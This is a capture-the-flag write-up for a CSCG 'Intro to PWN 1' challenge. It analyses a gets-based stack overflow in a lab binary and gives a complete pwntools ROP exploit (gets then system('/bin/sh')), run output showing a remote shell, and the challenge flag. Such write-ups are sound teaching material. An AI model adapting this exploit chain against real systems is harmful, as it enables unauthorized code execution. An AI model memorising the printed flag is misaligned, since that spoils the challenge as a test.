# Intro 1

## CTF Write-up: Intro to PWN 1 - ROP Ret2Syscall (gets -> system)

**Challenge:** Intro to PWN 1 (116 points)**Description:** A basic pwn challenge where the direct `win` function is patched. Hints suggest building on basic overflow concepts.**Attachments:** `intro-pwn-1.zip` (containing `vuln.c`, the `intro-pwn` binary)**Connection:** `ncat --ssl-verify 191378e46f47ff8f0f8253da-1024-intro-pwn-1.challenge.cscg.live 1337`

#### Analysis

1. **Source Code (`vuln.c`):**
   * The function `vuln` contains a classic **Stack Buffer Overflow** vulnerability. It uses `gets` to read into a `char name[16]` buffer without any size limit.
   * A `win` function exists (`0x4011d5`) but the description explicitly states it's useless (`system("echo no cat /flag for you")`). We cannot simply redirect execution to it.
2. **Binary Protections (`checksec`):**
   * `Partial RELRO`: Standard, not a significant hindrance here.
   * `No canary found`: **Critical.** This means we can overwrite the saved return address on the stack without triggering a security check.
   * `NX enabled`: **Critical.** The stack is marked as non-executable, preventing us from injecting and running shellcode directly on the stack.
   * `No PIE`: **Critical.** The binary's addresses (functions, gadgets, `.bss` section) are static. We don't need an information leak to know where things are located.
3. **Disassembly (`gdb`):**
   * The `name` buffer is 16 bytes (`0x10`) below the saved frame pointer (`rbp`).
   * The standard x64 function prologue means the saved return address (`rip`) is located `0x10` (buffer size) + `0x8` (saved `rbp`) = `0x18` (24) bytes after the start of the `name` buffer.

#### Vulnerability: Stack Buffer Overflow -> Control RIP

The unbounded `gets(name)` allows us to write past the 16-byte `name` buffer. Since there is no stack canary, we can overwrite the saved `rbp` and, more importantly, the saved return address (`rip`) stored on the stack. By carefully crafting our input, we can replace the original return address with an address of our choosing, hijacking the program's control flow when the `vuln` function returns.

#### Attack Plan: ROP (Return-Oriented Programming)

Since NX prevents executing shellcode on the stack and `ret2win` is not viable, we must use ROP. Our goal is to execute `system("/bin/sh")` to get a shell on the server.

1. **Target Function:** We need to call the `system` function. Its address in the Procedure Linkage Table (PLT) is static because PIE is disabled. We can find this using `objdump -d intro-pwn | grep system@plt` or let `pwntools` find it (`elf.plt['system']`).
2. **Target Argument:** `system` requires one argument (passed via the `RDI` register on x64): a pointer to the command string (`/bin/sh`).
3. **Controlling `RDI`:** We need a ROP gadget to load an address into `RDI`. The standard gadget for this is `pop rdi; ret`. We search the binary for this sequence using `ROPgadget` or `pwntools`. The address `0x4012b3` contains this gadget.
4. **Getting the `/bin/sh` String:** The string `/bin/sh` doesn't exist within the binary itself. We need to write it into memory at a predictable location.
   * We can leverage the `gets` function (also available via its PLT entry, `elf.plt['gets']`) within our ROP chain.
   * We choose a writable memory location, such as the `.bss` section (e.g., `0x404080`), whose address is static (No PIE).
5. **ROP Chain Construction:**
   * Send 24 bytes of padding to fill the `name` buffer and overwrite the saved `rbp`.
   * **Gadget 1:** Address of `pop rdi; ret` (`0x4012b3`).
   * **Argument 1:** Address of the target buffer in `.bss` (`0x404080`). This address will be popped into `RDI`.
   * **Function 1:** Address of `gets@plt`. This call will read input from the user (us) and write it to the location specified by `RDI` (our `.bss` address). We will send `/bin/sh`.
   * **Gadget 2:** Address of `pop rdi; ret` (`0x4012b3`) again. This executes after `gets` returns.
   * **Argument 2:** Address of the `.bss` buffer (`0x404080`), which now contains `/bin/sh\x00`. This address will be popped into `RDI`.
   * **Function 2:** Address of `system@plt`. This calls `system` with `RDI` pointing to our `/bin/sh` string, giving us a shell.

#### Exploit Script (Python w/ pwntools)

```python
#!/usr/bin/env python3
from pwn import *
import re # For flag extraction later

# --- Setup ---
# Load the binary context
context.binary = elf = ELF("./intro-pwn")
context.arch = 'amd64'
# context.log_level = 'debug' # Enable for detailed ROP chain/interaction view

# --- Constants and Addresses ---
OFFSET = 24                 # Padding bytes to reach RIP
BSS_WRITE_ADDR = 0x404080   # Chosen writable address in .bss section
POP_RDI_RET = 0x00000000004012b3 # Gadget: pop rdi; ret
GETS_PLT = elf.plt['gets']      # Address of gets in PLT
SYSTEM_PLT = elf.plt['system']  # Address of system in PLT

# --- Connection ---
# p = process(elf.path) # Uncomment for local testing
HOST = '191378e46f47ff8f0f8253da-1024-intro-pwn-1.challenge.cscg.live'
PORT = 1337
p = remote(HOST, PORT, ssl=True) # Connect to remote server

# --- Build ROP Chain ---
# Use pwntools ROP module for cleaner chain building
rop = ROP(elf)

# 1. call gets(&bss_addr) to read "/bin/sh" into memory
rop.call(GETS_PLT, [BSS_WRITE_ADDR])
# 2. call system(&bss_addr) which now holds "/bin/sh"
rop.call(SYSTEM_PLT, [BSS_WRITE_ADDR])

# Construct final payload: Padding + ROP Chain
payload = b'A' * OFFSET + rop.chain()
log.info("ROP Chain:\n" + rop.dump()) # Print the constructed chain

# --- Interaction ---
# Receive the initial prompt
log.info("Receiving initial prompt...")
p.recvuntil(b"What is your name?\n")

# Send the overflow payload containing the ROP chain
log.info("Sending ROP payload...")
p.sendline(payload)

# First part of ROP chain executes: gets(&bss_addr)
# Send "/bin/sh" string (null-terminated) which gets written to BSS_WRITE_ADDR
log.info("Sending '/bin/sh' to gets()...")
p.sendline(b"/bin/sh\x00")

# Second part of ROP chain executes: system(&bss_addr) -> Shell!
log.success("Payload sent, switching to interactive mode...")
p.interactive() # Hand over control to user for shell interaction
```

#### Execution and Result

Running the exploit script successfully overflowed the buffer, executed the ROP chain, wrote `/bin/sh` into the `.bss` section via `gets`, and then called `system` with the address of that string, resulting in a shell on the remote server.

```
[*] '/home/kali/Desktop/intro-pwn-1 (1)/intro-pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to 191378e46f47ff8f0f8253da-1024-intro-pwn-1.challenge.cscg.live on port 1337: Done
[*] Loading gadgets for '/home/kali/Desktop/intro-pwn-1 (1)/intro-pwn'
[*] ROP Chain:
    0x0000:         0x4012b3 pop rdi; ret
    0x0008:         0x404080 BSS section to write to (.bss)
    0x0010:         0x401060 gets
    0x0018:         0x4012b3 pop rdi; ret
    0x0020:         0x404080 address of "/bin/sh" in .bss
    0x0028:         0x401080 system
[*] Receiving initial prompt...
[*] Sending ROP payload...
[*] Sending '/bin/sh' to gets()...
[+] Payload sent, switching to interactive mode...
[*] Switching to interactive mode
Hello AAAAAAAAAAAAAAAAAAAAAAAA\xb3\x12@\x00\x00\x00\x00\x00\x80@\x00\x00\x00\x00\x00`\x10@\x00\x00\x00\x00\x00\xb3\x12@\x00\x00\x00\x00\x00\x80@\x00\x00\x00\x00\x00\x80\x10@\x00\x00\x00\x00!
I have a present for you: 50015
$ ls             <-- Commands entered in the interactive shell
bin
boot
dev
etc
flag
home
intro-pwn
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
ynetd
$ cat flag       <-- Reading the flag
CSCG{5om3t1m35_y0u_c4nt_533_th3_f0r35t_f0r_th3_tr335}$
[*] Got EOF while reading in interactive
```

**Flag:** `CSCG{5om3t1m35_y0u_c4nt_533_th3_f0r35t_f0r_th3_tr335}`

#### Conclusion

This challenge demonstrated a classic stack buffer overflow exploitation technique using Return-Oriented Programming (ROP) to bypass NX protection. The absence of stack canaries and PIE simplified the exploitation. The key step, beyond a simple `ret2system`, was to incorporate a call to `gets` within the ROP chain (`ret2gets`) to first write the needed `/bin/sh` string into a known memory location before calling `system`.
